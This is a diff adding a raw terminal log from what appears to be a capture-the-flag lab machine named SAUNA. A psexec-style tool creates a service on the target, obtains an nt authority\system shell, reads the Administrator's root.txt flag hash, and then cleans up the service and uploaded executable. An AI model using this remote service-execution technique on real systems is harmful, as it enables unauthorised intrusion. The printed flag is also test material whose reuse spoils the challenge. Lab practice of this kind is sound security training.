@@ -1,0 +1,43 @@
+[*] Creating service zcKr on 10.10.10.175.....                       
+[*] Starting service zcKr.....    
+[!] Press help for extra shell commands                              
+Microsoft Windows [Version 10.0.17763.973]                           
+(c) 2018 Microsoft Corporation. All rights reserved.                 
+
+C:\Windows\system32>whoami        
+nt authority\system               
+
+C:\Windows\system32>cd c:\        
+
+c:\>cd Administrator              
+b'The system cannot find the path specified.\r\n'                    
+c:\>cd Users                      
+
+c:\Users>cd Administrator         
+
+c:\Users\Administrator>cd Desktop 
+
+c:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.  
+ Volume Serial Number is 489C-D8FC                                   
+
+ Directory of c:\Users\Administrator\Desktop                         
+
+01/23/2020  04:11 PM    <DIR>          .                             
+01/23/2020  04:11 PM    <DIR>          ..                            
+01/23/2020  11:22 AM                32 root.txt                      
+               1 File(s)             32 bytes                        
+               2 Dir(s)   7,423,586,304 bytes free                   
+
+c:\Users\Administrator\Desktop>type root.txt                         
+f3ee04965c68257382e31502cc5e881f  
+c:\Users\Administrator\Desktop>hostname                              
+SAUNA                             
+
+c:\Users\Administrator\Desktop>exit                                  
+[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0        
+[*] Opening SVCManager on 10.10.10.175.....                          
+[*] Stopping service zcKr.....    
+[*] Removing service zcKr.....    
+[*] Removing file CuaFkiJv.exe.....                                  
+user@kali:/opt/CrackMapExec$                                                                                                                
